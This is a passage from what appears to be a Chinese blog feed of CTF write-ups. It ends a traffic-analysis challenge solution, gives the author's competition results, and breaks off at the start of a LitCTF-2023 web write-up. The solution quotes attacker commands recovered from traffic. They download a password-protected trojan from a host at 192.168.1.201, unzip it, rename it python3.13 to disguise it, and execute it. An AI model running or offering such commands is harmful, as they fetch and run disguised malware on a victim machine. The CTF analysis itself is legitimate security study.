+&lt;li&gt;&lt;code&gt;curl 192.168.1.201:8080/shell.zip -o /tmp/123.zip&lt;/code&gt;下载木马文件 输出到&lt;code&gt;/tmp/123.zip&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip&lt;/code&gt;使用密码&lt;code&gt;nf2jd092jd01&lt;/code&gt;将&lt;code&gt;123.zip&lt;/code&gt;解压出来&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;mv /tmp/shell /tmp/python3.13&lt;/code&gt; 将&lt;code&gt;shell&lt;/code&gt;文件重命名为&lt;code&gt;python3.13&lt;/code&gt;伪装成python文件 藏在/tmp目录下&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;chmod +x /tmp/python3.13&lt;/code&gt; 给予&lt;code&gt;python3.13&lt;/code&gt;文件权限&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/tmp/python3.13&lt;/code&gt; 运行伪装成&lt;code&gt;python3.13&lt;/code&gt;的木马文件&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;得出&lt;strong&gt;木马进程执行的本体文件&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag{python3.13}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;结语&lt;/h2&gt;
+&lt;p&gt;剩下的我就不会了 /(ㄒoㄒ)/~~ （赛后没看WP，在准备期末考试）
+有时间看懂了WP再进行更新&lt;/p&gt;
+&lt;p&gt;这次比赛只做出了两道Web和两道流量分析&lt;/p&gt;
+&lt;p&gt;国赛孤军奋战这一块
+​个人排名1400/8000
+​队伍排名1200/3000&lt;/p&gt;
+&lt;p&gt;其中Redjs那个题 是因为最近博客服务器中存在CVE漏洞导致服务器被黑才了解那个CVE&lt;/p&gt;
+&lt;p&gt;​服务器因cve失陷 比赛因cve拿分&lt;/p&gt;
 </content:encoded></item><item><title>【易】【LitCTF-2023】Web题目 WriteUp 合集</title><link>https://chuzoux.top/posts/litctf-2023/</link><guid isPermaLink="true">https://chuzoux.top/posts/litctf-2023/</guid><description>【LitCTF-2023】Web题目 的 WriteUp 总体题目简单 适合入门学习</description><pubDate>Fri, 14 Nov 2025 20:33:50 GMT</pubDate><content:encoded>&lt;h1&gt;【LitCTF-2023】Web题目 WriteUp 合集&lt;/h1&gt;
 &lt;p&gt;&lt;strong&gt;题目链接：&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
